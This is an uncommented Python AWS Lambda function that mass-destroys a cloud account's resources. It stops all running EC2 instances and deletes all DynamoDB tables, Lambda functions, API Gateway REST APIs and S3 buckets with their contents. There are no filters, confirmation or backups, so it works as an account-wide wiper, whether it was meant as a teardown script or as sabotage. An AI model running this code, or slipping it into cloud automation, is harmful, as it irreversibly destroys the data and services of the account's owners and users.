import boto3

def lambda_handler(event, context):
    ec2 = boto3.client('ec2')
    instances = ec2.describe_instances(Filters=[{'Name': 'instance-state-name','Values': ['running']}])
    for r in instances['Reservations']:
        for i in r['Instances']:
            ec2.stop_instances(InstanceIds=[i['InstanceId']])

    dynamodb = boto3.client('dynamodb')
    tables = dynamodb.list_tables()['TableNames']
    for table in tables:
        dynamodb.delete_table(TableName=table)

    lambda_client = boto3.client('lambda')
    functions = lambda_client.list_functions()['Functions']
    for func in functions:
        lambda_client.delete_function(FunctionName=func['FunctionName'])

    apigateway = boto3.client('apigateway')
    apis = apigateway.get_rest_apis()['items']
    for api in apis:
        apigateway.delete_rest_api(restApiId=api['id'])

    s3 = boto3.resource('s3')
    for bucket in s3.buckets.all():
        try:
            bucket.objects.all().delete()
            bucket.delete()
        except Exception as e:
            print(f"Bucket error: {bucket.name} - {str(e)}")

    print("All deletions attempted.")
